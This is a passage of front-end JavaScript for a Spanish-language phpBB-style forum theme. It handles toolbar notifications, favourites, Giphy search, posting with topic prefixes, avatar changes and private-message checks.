                                    tag: 'input',
                                    attributes: {
                                        onclick: 'ops.toolbar.nosound()',
                                        id: 'checkboxsound',
                                        type: 'checkbox',
                                        name: 'sound',
                                        value: 'sound'
                                    }
                                }]
                            }]
                        }),
                        h = init.g('#notif_list');
                    h && (init.replaceHtml(e, h.lastChild));
                    ops.toolbar.checksound();
                },
            },
            favicon: init.g('#fav_icon').href,
            cambiarFavicon: function (n) {
                var a = init.g('#notif_unread'),
                    b = init.g('#fav_icon'),
                    c = function (href) {
                        b.href = href
                    },
                    d = function (tit) {
                        document.title = tit
                    },
                    e = 'https://allphpbb31.com/fav_act.jpg',
                    f = '(' + n + ') ' + ops.titulo_pagina;
                n === 0 || n === '' ? b.href != ops.toolbar.favicon && (c(ops.toolbar.favicon), d(ops.titulo_pagina)) : (c(e), d(f));
            },
            notify: {
                go: function (t, e, i, o, s) {
                    e = 'undefined' != typeof e ? e : null,
                        i = 'undefined' != typeof i ? i : 'normal',
                        o = null != e ? '<img src="' + e[1].avatar + '"/>' : 'undefined' != typeof o ? '<i class="' + o + '" aria-hidden="true"></i> ' : ops.mi_avatar;
                    var n = init.g('#' + Toolbar.LIVE_NOTIF),
                        a = null != e ? e[0].ticket : '';
                    null != e && init.g('#chatNElem').play();
                    if (n) {
                        var r = ops.toolbar.notify.create(e, i, o, t, s, a);
                        init.move(n, r, 'prepend'), ops.toolbar.LiveFx.main(s)
                    }
                },
                create: function (f, id, imagen, e, s, a) {
                    var t = init.create('div', {
                        attributes: {
                            id: id,
                        },
                        class: f == null ? 'fa_notification' : 'fa_notification chatNlive',
                        childs: [{
                            tag: 'div',
                            class: 'content ellipsis new',
                            childs: [{
                                tag: 'div',
                                class: 'avanotif',
                                style: {
                                    display: 'inline'
                                },
                                html: imagen,
                            }, {
                                tag: 'span',
                                class: 'text_notif_live',
                                html: e
                            }]
                        }, {
                            tag: 'div',
                            class: 'close_live',
                            style: {
                                display: true == s ? '' : 'none',
                            },
                            attributes: {
                                onclick: 'ops.toolbar.LiveFx.close(init.closest(this, \'.fa_notification\'),0,' + a + ')'
                            },
                            childs: [{
                                tag: 'i',
                                class: 'fa fa-window-close',
                                attributes: {
                                    'aria-hidden': 'true'
                                }
                            }]
                        }]
                    });
                    return t
                },
                save: function (a) {
                    Cookies.set('chat_notif', a, {
                        expires: 365
                    });
                },
            },
            LiveFx: {
                main: function (c) {
                    var a = init.g('.fa_notification');
                    init.myarray(a, function (i) {
                        if (i.style.display != 'none' && !/faUnbound/.test(i.className)) {
                            $(i).stop(true, true).off('mouseover mouseleave');
                            i.classList.add('faUnbound');
                            ops.toolbar.LiveFx.open(i);
                            true != c && (ops.toolbar.LiveFx.close(i), ops.toolbar.LiveFx.over(i));
                        }
                    })
                },
                over: function (i) {
                    i.addEventListener('mouseover', function () {
                        window.clearTimeout(ops.closeNotify);
                    }, false);
                    i.addEventListener('mouseleave', function () {
                        ops.toolbar.LiveFx.close(i, 500)
                    }, false)
                },
                open: function (i) {
                    setTimeout(function () {
                        i.style.marginLeft = '0';
                    }, 500);
                },
                close: function (i, time, f) {
                    time = 'undefined' != typeof time ? time : 6000;
                    i.id == 'chat' && f != '' && ops.toolbar.notify.save(f);
                    ops.closeNotify = window.setTimeout(function () {
                        i.style.marginLeft = '-350px';
                        window.setTimeout(function () {
                            init.hide(i)
                        }, 1000)
                    }, time);
                },
            },
            refresh: function () {
                var n, c, a = init.g('.contentText'),
                    b = init.g('#notif_unread');
                var t = (setInterval(1000), Toolbar.refresh);
                Toolbar.refresh = function (e) {
                    t(e);
                    n = e.unread;
                    ops.indice.accionespornotificacion();
                    ops.toolbar.notificaciones.clase();
                    ops.prefijos();
                    setTimeout(function () {
                        ops.toolbar.cambiarFavicon(n);
                        ops.toolbar.LiveFx.main();
                        ops.toolbar.notificaciones.cero.setup(n)
                    }, 200);
                    if (n) {
                        b.textContent = n;
                        ops.toolbar.setsound();
                    }
                }
            },
            setsound: function () {
                var playPromise = ops.audio.play();
                Cookies.get('noSound') ? (ops.audio.volume = 0) : (ops.audio.volume = .33, playPromise !== undefined && playPromise.then(_ => {}).catch(error => {}));
            },
            nosound: function () {
                var c = init.g('#checkboxsound'),
                    d = init.g('#noSoundText'),
                    e = c.previousElementSibling.previousElementSibling;
                if (c && c.checked != false) {
                    Cookies.set('noSound', 1, {
                        expires: 365
                    });
                    e.className = 'fa fa-volume-up';
                    d.textContent = ' Sonido '
                } else {
                    Cookies.remove('noSound');
                    e.className = 'fa fa-volume-off';
                    d.textContent = ' Sin sonido ';
                    ops.toolbar.setsound()
                }
            },
            checksound: function () {
                var a = init.g('#checkboxsound');
                Cookies.get('noSound') && (a && (a.checked = true, a.previousElementSibling.previousElementSibling.className = 'fa fa-volume-up', init.g('#noSoundText').textContent = ' Sonido '))
            },
            returntitulo: function () {
                var a = init.g('#notif_unread'),
                    b = init.g('#fav_icon');
                b.href = 'https://allphpbb31.com/bowling-ball.ico';
                a.innerHTML = '';
                document.title = document.title.match(/[^\(.*\)]\w.+/g)[0];
            },
            favoritos: {
                setup: function () {
                    var a = init.g('#fa_right'),
                        e = init.create('a', {
                            attributes: {
                                id: 'mis_favoritos',
                                onclick: 'ops.toolbar.favoritos.get(this)'
                            },
                            class: 'leftHeaderLink',
                            text: 'Favoritos',
                            childs: [{
                                tag: 'i',
                                style: {
                                    marginLeft: '13px'
                                },
                                class: 'fa fa-bars',
                            }, {
                                tag: 'span',
                                attributes: {
                                    id: 'cant_fav'
                                }
                            }]
                        });
                    init.move(a, e, 'append');
                },
                lista: function () {
                    var b = init.g('#mis_favoritos'),
                        m = init.create('div', {
                            attributes: {
                                id: 'fav_list',
                            },
                            childs: [{
                                tag: 'span',
                                class: 'fav_cont',
                                style: {
                                    minHeight: '96px'
                                }
                            }, {
                                tag: 'li',
                                class: 'see_all',
                                childs: [{
                                    tag: 'i',
                                    class: 'fa fa-bars',
                                    style: {
                                        float: 'left',
                                        marginTop: '-3px'
                                    }
                                }, {
                                    tag: 'a',
                                    attributes: {
                                        href: '/search?search_id=favouritesearch'
                                    },
                                    text: 'Ver todos mis temas favoritos'
                                }]
                            }]
                        });
                    !init.g('#fav_list') && (init.move(b, m, 'after'));
                },
                borrar: function (a, c) {
                    var b = 'delete_favourite%5B' + a + '%5D=on&submit&confirm=1';
                    ops.xmlhRequest(b, '/search?search_id=favouritesearch', function (x) {
                        var topic = init.closest(c, '.cont');
                        init.fadeOut(topic, 500);
                        setTimeout(function () {
                            init.borrar(topic);
                            !init.g('.favlisttopic').length && ops.toolbar.favoritos.vacio();
                        }, 501)
                    });
                },
                vacio: function () {
                    var i = init.g('.fav_cont')[0];
                    init.replaceHtml(init.create('div', {
                        childs: [{
                            tag: 'p',
                            class: 'mensaje',
                            text: 'No tienes temas favoritos'
                        }]
                    }), i);
                },
                get: function () {
                    var e, i, o;
                    ops.toolbar.favoritos.lista(),
                        i = init.g('.fav_cont')[0],
                        o = init.g('#fav_list');
                    'block' == o.style.display ? init.hide(o) : init.show(o);
                    !init.contiene(i, 'view=newest') && (ops.indice.spin(i, '#000', '32px', '30px auto'), ops.xmlhRequest('', '/search?search_id=favouritesearch', function (t) {
                        var o, s = t.responseXML,
                            n = init.g('#cp-main', s),
                            a = init.g('.topictitle', n);
                       if (a.length < 1){  
                           ops.toolbar.favoritos.vacio()
                        }else{ 
                        init.myarray(a, function (t) {
                            var e = t.href.match(/(?!\/t)(\d+)(?=-)/g)[0],
                                i = t.textContent,
                                s = t.className,
                                hr = t.href + '&view=newest';
                            o +=  '<span class="cont"><a class="' + s + ' favlisttopic" href="' + hr + '">' + i + '</a><a href="#" onclick="ops.toolbar.favoritos.borrar(' + e + ', this); return false"><i class="fa fa-times-circle" aria-hidden="true" style="color:red;font-size:14px"></i></a></span>';
                        
                        }); 
                        i.innerHTML = o; 
                        ops.actividadFeed(ops.mi_nombre + ' vió sus temas favoritos ', 'Historial'); 
                         ops.prefijos()
                    }
                    }))
                },
            },
            align: function () {
                setTimeout(function () {
                    var a = Toolbar,
                        b = _userdata,
                        c = init.g('#' + Toolbar.MENU),
                        d = init.g('#fa_menulist'),
                        e = init.g('#fa_welcome'),
                        f = init.g('#fa_notifications'),
                        g = init.g('#fa_hide');
                    try {
                        var welcome_pos = e && e.getBoundingClientRect();
                        if ((welcome_pos != null) && (typeof (welcome_pos) != 'undefined')) {
                            d.style.cssText = '';
                            var margin = ops.scroll.getOffset(e).left + e.offsetWidth - d.offsetWidth + 1;
                            d.style.left = (margin > 0 ? margin : 0) + 'px';
                        } else {
                            var margin = (b.notifications ? f.offsetWidth : 0) + g.offsetWidth - 1;
                            d.style.cssText = '';
                            d.style.right = margin + 'px';
                        }
                    } catch (e) {
                        var margin = (b.notifications ? f.offsetWidth : 0) + g.offsetWidth - 1;
                        d.style.cssText = '';
                        d.style.right = margin + 'px';
                    }
                }, 1);
            },
            menufx: function () {
                var a = init.g('#fa_welcome'),
                    b = init.g('#fa_notifications');
                a && (a.addEventListener('click', function () {
                    init.fadeIn(init.g('#fa_menulist'), '500');
                    ops.toolbar.align()
                }, false));
                b && (b.addEventListener('click', function () {
                    Toolbar._alignNotifications();
                }, false))
            },
        },
        giphy: {
            autoclose: true,
            search: function (query, b) {
                ops.giphy.timeout && ops.giphy.abort(), query ? ops.giphy.timeout = window.setTimeout(function () {
                    ops.giphy.reset(!0, '<i style="color:rgb(0, 0, 0);font-size:20px"class="fa fa-spinner fa-pulse"></i>', b);
                    ops.giphy.query = init.fixedEncodeURIComponent(query);
                    ops.giphy.request = $.get('http://api.giphy.com/v1/gifs/search?q=' + ops.giphy.query + '&limit=10&rating=pg-13&api_key=dc6zaTOxFJmzC', function (o) {
                        ops.request = null,
                            ops.giphy.offset = o.pagination.offset + '10',
                            ops.giphy.offset_total = o.pagination.total_count,
                            ops.giphy.reset(true, '', b),
                            ops.giphy.addGIF(o, '', b);
                    })
                }, 200) : ops.giphy.reset(true, '', b);
            },
            abort: function () {
                ops.giphy.timeout && (window.clearInterval(ops.giphy.timeout), ops.giphy.timeout = null), ops.giphy.request && (ops.giphy.request.abort(), ops.giphy.request = null);
            },
            offset: 10,
            addGIF: function (data, loadMore, b) {
                var img, gif = data.data,
                    i = 0,
                    j = gif.length,
                    k = 'editor' == b ? init.g('#gifactif_results') : init.g('#gifactif_results_chat');
                if (j) {
                    init.g('.gifactif_imagelist').length == 0 && k.insertAdjacentHTML('afterbegin', '<div class="gifactif_imagelist" /></div>');
                    for (; i < j; i++) {
                        ops.img_gif = '<img id="' + gif[i].id + '" src="' + gif[i].images.fixed_width.url + '" onclick="ops.giphy.insert(this, \'' + b + '\'); this.style.opacity=\'0.6\'" />';
                        init.g('.gifactif_imagelist')[0].insertAdjacentHTML('afterbegin', ops.img_gif);
                    }
                } else if (!loadMore) {
                    ops.giphy.reset(true, ops.html.not_found, b);
                }
            },
            scrolling: function (a, b) {
                if (a.scrollHeight - a.scrollTop === a.clientHeight) {
                    ops.giphy.loadMore(b);
                }
            },
            loadMore: function (b) {
                if (10 < ops.offset_total) {
                    ops.request = $.get('http://api.giphy.com/v1/gifs/search?q=' + ops.giphy.query + '&offset=' + ops.giphy.offset + '&limit=100&rating=pg-13&api_key=dc6zaTOxFJmzC', function (data) {
                        ops.giphy.request = null;
                        ops.giphy.offset = data.pagination.offset + '10';
                        ops.giphy.offset_total = data.pagination.total_count;
                        ops.giphy.addGIF(data, true, b);
                    });
                }
            },
            insert: function (c, b) {
                var a = 'editor' == b,
                    d = '[img]http://media0.giphy.com/media/' + c.id + '/giphy.gif[/img]';
                a ? (ops.textarea.value += d) : ops_chat.submit(d);
                if (ops.giphy.autoclose) {
                    ops.giphy.reset();
                }
            },
            reset: function (a, d, b) {
                var c = 'editor' == b ? init.g('#gifactif_results') : init.g('#gifactif_results_chat');
                c && (c.innerHTML = d ? d : '');
                !d && !a && (init.g('editor' == b ? '#gifactif' : '#gifactif_chat').style.display = 'none');
                !a && (init.g('editor' == b ? '#gifactif_search' : '#gifactif_search_chat').value = '');
            },
            gifinit: function (b) {
                var a = init.g('editor' == b ? '#gifactif_search' : '#gifactif_search_chat');
                a.addEventListener('keyup', function (e) {
                    var k = e.keyCode,
                        c = this.value;
                    if (k && (k == 16 || k == 17 || k == 18 || k == 20 || k == 37 || k == 38 || k == 39 || k == 40)) {
                        return;
                    } else {
                        ops.giphy.search(c, b);
                    }
                }, false);
            },
        },
        post: {
            send: function (c, event) {
                var a = document.forms.post,
                    h = a.post.value,
                    i = a.subject,
                    j = a.message,
                    k = a.post,
                    u = a.username,
                    uF = a.userfriend,
                    uG = a.usergroup,
                    l = ops.serialize(a),
                    N = isNewTopic || ind,
                    E = isEditPost,
                    M = isMPNew,
                    T = isMPedit,
                    
                    b = function () {
                        ops.toolbar.notify.go(ops.mi_nombre + ops.lang.subjectError, null, 'alert', 'fas fa-exclamation-circle', true)
                    },
                    e = function () {
                        ops.toolbar.notify.go(ops.mi_nombre + ops.lang.namePmError, null, 'alert', 'fas fa-exclamation-circle', true)
                    };
            
            i.value.length <= 10 || j.value.length <= 10 || !j.value ||  ((M || T) && 0 == (u.value.length || uF.value.length || uG.value.length)) ? N ? b(): (M || T) &&  (0 == i.value && (i.value = "Enviado sin título"),0 == (u.value.length || uF.value.length || uG.value.length) && e()) : ops.post.button(!0, c, j, h, event, function () {
                  ops.post.go(c, l, j, i, h);
                });
            
            },
            button: function (a, c, j, h, event, f) {
                ops.preventDoubleClick(c, a, false, false, event, undefined, undefined, function () {
                    j.style.color = a ? '#ccc' : '#000';
                    ops.temas.editor.loading(a);
                    'undefined' != typeof f && f();
                });
            },
            go: function (c, l, j, i, h) {
                var N = isNewTopic || ind,
                    E = isEditPost,
                    M = isMPNew,
                    T = isMPedit,
                    vacio = function (target, value) {
                        target.value = value
                    },
                    success = N ? ': Se creó el tema: ' : E ? ': Se editó el tema: ' : (M || T) && ' Se envió un mp',
                    placeholder = N ? 'Tema creádo con éxito' : E ? 'Tema editado con éxito' : (M || T) && 'Mensaje enviado',
                    url = N || E ? '/post' : '/privmsg';
                ops.xmlhRequest(l + '&post=1', url, function (e) {
                    var m, x = e.responseXML,
                        y = init.g('.error', x)[0],
                        a = ops.mi_nombre + ' ocurrio un error, intenta de nuevo, si esto continua, contacta a un administrador',
                        b = i.value;
                    ops.placeholder(j, placeholder);
                    vacio(j, '');
                    vacio(i, '');
                    vacio(c, h);
                    ops.temas.editor.loading(!1);
                    if (N || E) {
                        !init.contiene(y, 'con éxito') ? ops.toolbar.notify.go(a, null, 'alert', 'fas fa-exclamation-circle', true) : (m = ops.temas.editor.getViewtopic(x), 'undefined' != typeof m ? ops.post.working(m, success, b) : location.href = '/')
                    } else(M || T) && (location.href = '/privmsg?folder=inbox')
                });
            },
            working: function (m, success, value) {
                var p = value,
                    n = isNewTopic || document.forms.post.f.value,
                    a = ops.mi_nombre + success + (n ? ' ' + p : '');
                13 != n && ops.actividadFeed(ops.mi_nombre + ' publicó el tema:' + p, 'historial');
                14 == n && ops.soporte_mp(p)
                ops.toolbar.notify.go(a, null, 'check', 'fas fa-check-double', true);
                window.setTimeout(function () {
                    window.location.href = m
                }, 2000);
            },
            ponerprefijos: function () {
                var i, e = ['Flood', 'Aviso', 'Tutorial', 'Duda', 'Pendiente', 'Aprobado', 'Rechazado', 'Resuelto', 'Pedido', 'Aporte', 'Afiliación', 'Idea', 'Staff', 'Publicidad', 'En curso', 'Resuelto', 'Actualizado', 'Sugerencia', 'Ayuda', 'Idea'],
                    a = init.create('select', {
                        attributes: {
                            id: 'prefCA',
                            name: 'prefijos',
                            onchange: 'ops.tagprefixo()',
                        },
                        childs: [{
                            tag: 'option',
                            attributes: {
                                value: ''
                            },
                            text: 'Prefijo'
                        }]
                    }),
                    c = document.forms.post.subject;
                for (i in e) {
                    var d = init.elem('option', {
                        value: '[' + e[i] + ']',
                        innerHTML: e[i]
                    });
                    init.move(a, d, 'append');
                    init.move(c, a, 'before');
                }
            },
            value_default: function () {
                var t = ops.mi_nombre,
                    e = function (num) {
                        return 'undefined' != typeof num ? isNewTopic == num : isNewTopic
                    },
                    w = isEditPost,
                    j = isMPNew,
                    k = isWallPost,
                    l = isMPpost,
                    o = isMPedit,
                    b = init.g('#avatar'),
                    g = init.g('.page-title')[0],
                    i = init.g('#main'),
                    c = document.forms.post.message,
                    d = document.forms.post.subject,
                    m = init.contiene(g, 'Publicar una respuesta'),
                    n = l && init.g('#username').value,
                    v = c.getAttribute('value'),
                    a = '[b]Nombre del foro:[/b]:\n[b]Link del foro:[/b]:\n[b]De que trata:[/b]:\n[b]Captura completa[/b]:\n',
                    h = '[problema][b]URL:[/b]:\n[b]Versión de mi foro:[/b]:\n[b]Navegador:[/b]:\n[b]Descripcion del problema[/b]:\n[b]Capturas de pantalla del problema[/b]:\n[/problema]',
                    f = '[codebox]Descripción del code[/codebox]\n \n[hidecode][code]Tu código aquí[/code][/hidecode]\n',
                    p = t + ' redacta tu nuevo tema, no olvides seleccionar el prefijo correspondiente',
                    q = e() ? p : k ? document.title : j ? t + ' redacta mensaje privado' : m ? t + ' escribe tu comentario...' : l ? t + ', responde el mensaje privado de ' + n : '',
                    r = e(7) ? '[widget]' : e(5) ? '[CSS]' : e(4) ? '[javascript]' : e(14) ? '[ayuda]' : e(11) ? '[skin]' : e(9) ? '[recursos]' : e(13) ? '[staff]' : e(15) ? '[beta]' : e(6) ? '[html]' : '',
                    s = w ? v : e(14) ? h : e(1) ? a : e(10) ? a : /(7|5|14|11|6|9|4)/.test(e()) ? f : '',
                    u = e() ? 'Newtopic' : k ? 'wallPost' : o && 'edit_mp';
                init.move(b, init.create('img', {
                    attributes: {
                        src: ops.miavatarSRC
                    },
                    style: {
                        height: '25px',
                        width: '25px',
                        borderRadius: '100%',
                        marginTop: '0'
                    }
                }), 'append');
                ops.placeholder(c, q);
                i.classList.add(u);
                d.value = r;
                c.value = s;
                setTimeout(ops.beforeUnload(c), 500);
            },
            salvatexto: function () {
                var c = init.g('#editor-textarea'),
                    j = isPostReply ? document.forms.post.t.value : Cookies.get('_id_tema_'),
                    k = window.localStorage;
                if (k.getItem('user_ava_' + j)) {
                    c.value = k.getItem('user_ava_' + j);
                    k.removeItem('user_ava_' + j);
                    Cookies.remove('_id_tema_');
                }
            },
            temasSimilares: function () {
                var t = document.forms.post.subject,
                    o = init.create('div', {
                        attributes: {
                            id: 'similaresContent'
                        },
                        childs: [{
                            tag: 'div',
                            class: 'similar_title',
                            text: 'Temas similares:',
                        }, {
                            tag: 'div',
                            attributes: {
                                id: 'topicSimilar'
                            },
                            text: 'Verifica que tu publicación no exista ya en en el foro',
                        }],
                    });
                t.addEventListener('click', function () {
                    !init.g('#topicSimilar') && init.move(this.parentNode, o, 'append');
                    this.addEventListener('blur', function () {
                        var link = '',
                            fr = document.createDocumentFragment(),
                            e = init.g('#topicSimilar'),
                            a = this.value,
                            regex = /(?:\[*.+\])(.*)/,
                            regex2 = /\/t(\d+)-(.+)(?=\?highlight)/,
                            b = init.fixedEncodeURIComponent(a.match(regex) ? a.match(regex)[1] : a),
                            cambiar = function (text) {
                                init.replaceHtml(init.create('p', {
                                    html: text,
                                }), e)
                            };
                        cambiar(ops.ajax_load);
                        if (a.length >= 5 && 0 != a) {
                            ops.xmlhRequest('', '/search?search_keywords=' + b, function (w) {
                                var x = w.responseXML,
                                    topictitle = init.g('.topictitle', x);
                                if (topictitle.length) {
                                    init.myarray(topictitle, function (i) {
                                        var href = i.href.match(regex2)[0],
                                            topic = i.textContent;
                                        link = init.create('a', {
                                            class: 'topictitle simi',
                                            attributes: {
                                                href: href,
                                                target: '_blank',
                                                style: 'display:block'
                                            },
                                            text: topic
                                        });
                                        init.move(fr, link, 'append');
                                    });
                                    init.fadeIn(e, 500, '', function (ele) {
                                        init.replaceHtml(fr, ele);
                                        ops.prefijos()
                                    });
                                } else {
                                    cambiar('No hay temas similares')
                                }
                            })
                        } else {
                            cambiar('No has escrito nada, o no es suficiente para buscar similares');
                        }
                    }, false)
                }, false)
            },
        },
        tooltips: function () {
            var options = {
                    animation: 'grow',
                    arrow: true,
                    speed: 300,
                    delay: 300,
                    onlyOne: true,
                    theme: 'tooltipster-ops',
                },
                queue = true,
                titles, parse = function () {
                    titles = $('[title]');
                    titles.tooltipster && titles.not('[title=""], .mentiontag, .tooltipstered, .index_topicname, .vote-bar, index_topicname, .lastpost a[href^="/u"], .trafico_a, .topictitle').tooltipster(options);
                };
            queue ? $(parse) : parse();
        },
        // ============================================================
// 🔹 MOD: cambiarAvatar()
// ------------------------------------------------------------
// EN: Handles avatar change request. Opens a modal prompt to
//     input a new avatar URL, sends it to /profile, updates
//     avatar live and syncs localStorage.
// ES: Gestiona el cambio de avatar. Muestra un cuadro de
//     diálogo para ingresar el nuevo link, actualiza el
//     perfil, el DOM y el almacenamiento local.
//
// Requisitos:
// - Depende de init.g() y ops.xmlhRequest()
// - Usa $.boxes() si jQuery está presente
// - Compatible con estructura de .postprofile personalizada
// ============================================================

cambiarAvatar: function () {
  try {
    var avatarTriggers = init.g('.avatar_ajax'); // clase creada en cambiarAvatarModal
    var w = window.localStorage;

    if (!avatarTriggers || !avatarTriggers.length) {
      console.warn('[ops] No se encontró ningún elemento con .avatar_ajax');
      return;
    }

    avatarTriggers[0].addEventListener('click', function () {
      // 🔧 Si usas jQuery + plugin boxes
      if (typeof $ === 'undefined' || typeof $.boxes !== 'function') {
        console.warn('[ops] $.boxes() no está disponible, omitiendo prompt.');
        return;
      }

      ops.me_avatar(); // función previa de inicialización de avatar

      $.boxes({
        mode: 'prompt',
        title: 'Introduce el link del avatar que deseas colocar en tu perfil',
        ok: function () {
          var e = init.g('.zzBoxes_input')[0].value;
          if (!e) {
            ops.toolbar.notify.go('Por favor introduce una URL válida.', null, 'alert', 'fas fa-exclamation-circle');
            return;
          }

          // Construir parámetros POST
          var q = {
            page_profil: 'avatars',
            mode: 'editprofile',
            user_id: ops.mi_id,
            avatarurl: e,
            submit: '1'
          };

          // 🔄 Enviar actualización de perfil (avatar)
          ops.xmlhRequest(q, '/profile', function (o) {
            // Segunda petición: recarga de avatar actual
            ops.xmlhRequest('', '/ajax/index.php?f=m&user_id=' + ops.mi_id, function (r) {
              var a = r.responseXML;
              var newAvatar = init.g('.mention_avatar', a)[0]?.src;

              if (!newAvatar) {
                console.warn('[ops] No se pudo obtener el nuevo avatar del XML.');
                return;
              }

              // Buscar todas las imágenes del usuario actual y reemplazar
              var imgs = init.g('img');
              init.myarray(imgs, function (img) {
                if (/me/.test(img.className)) {
                  init.elem(img, {
                    style: { display: 'none' },
                    src: newAvatar
                  });
                  init.fadeIn(img, 200);
                }
              });

              // 🔐 Sincroniza localStorage
              w.removeItem('user_ava_' + ops.mi_id);
              w.setItem('user_ava_' + ops.mi_id, '<img src="' + newAvatar + '">');

              // 🕓 Notificación visual
              ops.actividadFeed(ops.mi_nombre + ' cambió su avatar', 'Historial');
              setTimeout(function () {
                ops.toolbar.notify.go(
                  ops.mi_nombre + ': El avatar fue cambiado',
                  null,
                  'check',
                  'fas fa-check-double',
                  false
                );
              }, 500);
            });
          });
        }
      });
    }, false);

  } catch (e) {
    console.error('[ops] Error en cambiarAvatar():', e);
  }
},

        open_blank: function () {
            if (ops.soy_adm) {
                var a = init.g('a'),
                    i = a.length;
                while (i--) {
                    /\/admin/g.test(a[i].href) && a[i].setAttribute('target', '_blank')
                }
            }
        },
        menuactivo: function () {
            var e = init.g('#page-header'),
                t = window.location.href.replace(/\?.*|#.*/, ''),
                o = init.g('a', e);
            if (e)
                init.myarray(o, function (a) {
                    if (/mainmenu/.test(a.className) && t === a.href.replace(/\?.*|#.*/, '')) {
                        a.className += ' menuactif';
                    }
                });
            var a = init.g('a', init.g('.rightside')[0]),
                b = init.create('a', {
                    attributes: {
                        href: '/h9-paypal',
                        target: '_blank'
                    },
                    text: ' Donar',
                    style: {
                        marginLeft: '10px'
                    }
                }),
                c = 'ops.start_Ncontent(\'stats\', this);return false',
                d = 'https://www.phpbb.com/downloads/',
                f = 'ops.abuse_msg(this);return false',
                s = init.g('.icon-home')[0];
            init.myarray(a, function (i) {
                /\/abuse\?/g.test(i.href) && (init.elem(i, {
                    innerHTML: 'Denunciar',
                    onclick: f
                }), init.move(i, b, 'after'));
                /www\.foroactivo\.com\/phpbb/g.test(i.href) && (init.elem(i, {
                    href: d,
                    innerHTML: 'phpBB3'
                }));
                /\/statistics/g.test(i.href) && i.setAttribute('onclick', c);
            });
            init.elem(s, {
                href: '/h2-staff',
                title: 'Acerca de nosotros...'
            });
        },
        prefijos: function (c) {
            opensource.prefijos(c);
        },
        tagprefixo: function () {
            var a = document.forms.post,
                b = /\[(.*?)\]/,
                c = a.prefijos.value,
                d = a.subject.value;
            a.subject.value = c.match(b) && c ? c + d.replace(b, '') : c + ' ' + d;
        },
        loadNotificationChat: function () {
            ops.checkOnline(function (x, y) {
                x ? ops.xmlhRequest('', '/u239wall', function (t) {
                    var e = t.responseXML,
                        i = init.g('.message-text', e)[0].textContent,
                        o = init.g('.message-date', e)[0].textContent,
                        b = i.replace(/'/g, '"'),
                        s = JSON.parse(b),
                        n = s[1].name + ' te menciono en el chat, ' + o.toLowerCase(),
                        a = Cookies.get('chat_notif'),
                        r = init.g('#chat');
                    init.Log('chat notif');
                    ops.mi_id == s[0].id && a != s[0].ticket && !r && ops.toolbar.notify.go(n, s, 'chat', 'fab fa-rocketchat', true);
                }) : console.log(y)
            })
        },
        checkTime: function (condicion) {
            var l = new Date(),
                b = l.getDate(),
                c = l.getMonth(),
                d = l.getFullYear(),
                f = l.getHours(),
                g = l.getMinutes(),
                fecha = b + '/' + (c < 10 ? '0' + (c + 1) : (c + 1)) + '/' + (d - 2e3),
                hora = f + ':' + (g < 10 ? '0' + g : g) + ' hrs.',
                a = 'undefined' == typeof condicion ? fecha + ' - ' + hora : condicion == 'fecha' ? fecha : condicion == 'hora' && hora;
            return a
        },
        check_mp: function () {
            var a = init.g('.navbut7'),
                b = init.g('a', a[0])[0],
                n = '0 Mensajes';
            if (ops.logout) {
                ops.checkOnline(function (x, y) {
                    x ? ops.xmlhRequest('', '/forum', function (x) {
                        var m, e = x.responseXML,
                            num, nodo, t = init.g('#i_icon_mini_new_message', e);
                        t && (num = t.title.match(/\d+/g),
                            nodo = init.create('fragment', {
                                childs: [{
                                    tag: 'div',
                                    class: 'TRnotice',
                                    style: {
                                        display: 'inline'
                                    },
                                    text: num + ' Mensaje' + (1 < num ? 's' : '')
                                }]
                            }),
                            init.replaceHtml(nodo, b));
                        console.log('verificando mps');
                    }) : console.log(y);
                });
            }
        },
        checkOnline: function (f) {
            if (navigator.onLine) {
                fetch('https://i.servimg.com/u/f18/19/17/54/05/logoti10.png').then(function (response) {
                    if (!response.ok) {
                        // Parece que hay acceso a Internet,
                        // pero la respuesta no ha sido ok
                        // También se puede comprobar el código de estado con response.status
                        // Y hacer algo específico según el estado exacto recibido
                        f(false, response.statusText);
                        throw Error(response.statusText);
                    } else {
                        f(true, response.statusText);
                    }
                }).catch(function (error) {
                    console.log('Problema al realizar la solicitud: ' + error.message);
                    Promise.reject(error);
                });
            } else {
                f(false, 'No hay red');
            }
        },
        init_check_mp: function () {
            setInterval(function () {
                ops.check_mp();
                ops.loadNotificationChat();
            }, 3.5e+4)
        },
        status_box: function (e, o) {
            var t = e.previousSibling,
                s = t.value,
                a = pu && init.g('.mi_status'),
                n = s + ' [table class=fecha_up][td]Se modifico:' + ops.checkTime() + ' [/td][/table]',
                i = ops.perfil.main.portada.split(n).estado,
                p = ops.mi_nombre + ' actualizó su estado: [color=#FF0000][b][i]' + s + '[/i][/b][/color]',
                l = 'Escribe un estado antes de enviar',
                u = ops.mi_nombre + ' ¿que tienes en mente?',
                r = 'profile_field_13_1',
                b = function () {
                    if (pu) {
                        a[0].textContent = i;
                    } else if (tm) {
                        var o = init.g('.me');
                        init.myarray(o, function (l) {
                            init.g('.estado_post', l)[0].innerHTML = i;
                        });
                    } else if (ind) {
                        setTimeout(function () {
                            ops.indice.extraActividad('/u92wall')
                        }, 3e3);
                    }
                };
            ops.preventDoubleClick(e, !0, !1, !1, o, undefined, undefined, function () {
                ops.feedFields(s, r, n, l, function () {
                    ops.toolbar.notify.go('Tu estado fue actualizado:' + s, null, 'poke', 'fas fa-plug');
                    ops.actividadFeed(p, 'status');
                    ops.actividadFeed(p, 'Historial');
                    Cookies.remove('perfil_status' + ops.sinEspacios(ops.mi_nombre));
                    ops.placeholder(t, 'Actualizado')
                    t.value = '';
                    setTimeout(function () {
                        ops.placeholder(t, u);
                    }, 1500);
                    Cookies.set('perfil_status' + ops.sinEspacios(ops.mi_nombre), n, {
                        expires: 365
                    });
                    b();
                    ops.preventDoubleClick(e, !1)
                })
            });
        },
        feedFields: function (value, field, newvaluetime, c, d) {
            return '' == value ? ($.boxes('alert', c), !1) : void ops.xmlhRequest('id=1&user=' + ops.mi_id + '&active=1&content=' + init.fixedEncodeURIComponent('[["' + field + '", "' + newvaluetime + '"]]') + '&tid=' + isTid, 'ajax_profile.forum?jsoncallback=jQuery1', function (x) {
                'undefined' != typeof d && d(this)
            });
        },
        soporte_mp: function (o) {
            var t = ops.mi_nombre,
                d = '[Mensaje automático] Tema nuevo en soporte: ' + o,
                f = ops.mi_nombre + ' creó un nuevo tema en soporte, dale seguimiento',
                g = '/privmsg?mode=post&post=1',
                h = 'inbox',
                i = 'post',
                j = ops.mi_nombre + ' un mp se envió al staff para que le den rápida atención a tu tema de soporte',
                k = 'Send',
                z = '2';
            ops.temas.main.post_mw(t, d, f, g, i, j, h, k, false)
        },
        mas_click: function () {
            var b = init.g('#plus_menu'),
                d = init.g('.tip_info')[0],
                c = function () {
